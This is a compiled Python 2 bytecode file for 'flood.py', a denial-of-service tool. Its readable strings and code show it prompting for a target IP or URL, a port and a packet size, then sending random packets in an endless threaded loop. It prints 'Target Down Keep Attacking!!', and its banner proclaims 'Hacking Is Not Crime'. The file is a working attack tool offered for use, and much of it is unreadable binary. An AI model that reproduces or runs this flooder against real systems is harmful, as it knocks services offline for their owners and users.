ó
¯\c           @   s  d  d l  m Z d  d l Td  d l Td  d l Td  d l  Td  d l Td  d l Z d  d l Z d  d l Z d  d l Z e j	 d k r e j
 d  n, e j	 d k r° e j
 d  n e j
 d  d Z e GHd	 Z Hd
 GHHd GHd GHe d  Z d GHe j e  Z d GHd e GHd GHd GHe d  Z d GHd" e e  GHd GHd d GHd GHe d  Z e j e  Z d GHe d k rd e e  GHn d GHe d  e   d GHe d  Hd GHHe d  d   Z d Z x@ y e e e f  Wn d GHn Xd  e e f GHe d!  qÐWd S(#   iÿÿÿÿ(   t   sleep(   t   *Nt   linux2t   cleart   win32t   clssã  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
| mmmmm   mmmm  mmmmmm m    m   mm   mmmmm | Made By :		        |
|   #    #"   " #      #  m"    ##     #   | Ren ( Kek Wibu ) :v        |
|   #    "#mmm  #mmmmm #m#     #  #    #   |			     	|
|   #        "# #      #  #m   #mm#    #   | Facebook :		     	|
| mm#mm  "mmm#" #mmmmm #   "m #    # mm#mm | www.facebook.com/rama5702  |
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
t   "s<   [+] Hacking Is Not Crime
[+] Hacking Is Art
[!] [ISEKAI] RINs   #########################s   Input IP Target/Web URL : s   IP / URL > s   ~~~~~~~~~~~~~~~~~~~~~~~~~s   [+] IP Addresss   [+] s   PORT:s   Input PORT > s
   [+] PORT 
s	   Packages
s   Max Size [65507]s   Input SIZE > iãÿ  s   [+] Send Packet s   [!] Max Size Only 65507 i   i   s   Ready To Sending Packetc         C   si   yV t  j  t  j t  j  } | j t t f  | j t t t f  t	 d  | j
 Wn d GHn Xd  S(   Nic   s+   [1;92m[DOWN]# Target Down Keep Attacking!!(   t   sockett   AF_INETt   SOCK_STREAMt   connectt   hostt   portt   sendtot   packett   ipR    t   close(   t   it   sock1(    (    s   flood.pyR
   D   s    
i    s   Check Your Internets'   [1;91m[ATTACK]# Attacking To [%s] [%s]g¹?s   [+] PORT 
[+] (   t   timeR    t   timeoutt   osR   t   stringt   threadt   syst   randomt   platformt   systemt   bannert   at	   raw_inputR   t   gethostbynameR   t   inputR   t   strt   packaget   _urandomR   t   quitR
   t   nt   start_new_thread(    (    (    s   flood.pyt   <module>   st   





		


	
	